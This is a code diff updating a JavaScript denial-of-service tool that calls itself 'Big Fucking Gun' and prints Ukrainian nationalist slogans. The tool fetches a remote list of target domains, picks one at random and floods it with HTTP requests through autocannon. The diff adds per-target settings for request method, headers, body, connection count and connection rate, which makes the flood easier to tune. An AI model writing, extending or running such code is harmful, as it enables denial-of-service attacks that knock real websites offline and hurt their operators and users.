@@ -9,17 +9,28 @@ const attack = async () => {
   console.log("\n\nFetching target...");
 
   const targets = await fetch(TARGETS_URL).then((r) => r.json());
-  const url = targets[Math.floor(Math.random() * targets.length)].domain;
+  const target = targets[Math.floor(Math.random() * targets.length)]
 
+  const url = target.domain;
+  const method = target.method || "GET";
+  const headers = target.headers || {};
+  const body = target.body || undefined;
+  const connectionRate = target.rps || undefined;
+  const connections = target.connections || 500;
+  
   console.log(`Attacking ${url}...`)
   const bar = new ProgressBar(`[:bar]`, { total: ATTACK_DURATION });
   const timer = setInterval(() => bar.tick(), 1000)
 
   const result = await autocannon({
     url,
+    method,
+    headers,
+    body,
     workers: 4,
-    connections: 500,
+    connections,
     duration: ATTACK_DURATION,
+    connectionRate,
   });
 
   clearInterval(timer);
@@ -46,7 +57,7 @@ const start = async () => {
   start();
 };
 
-console.log("Big Fucking Gun, version 0.0.3-beta\n");
+console.log("Big Fucking Gun, version 0.0.4-beta\n");
 console.log("================================");
 console.log("Слава Україні!\nГероям Слава!\nСлава Нації!\nСмерть ворогам!");
 console.log("================================");
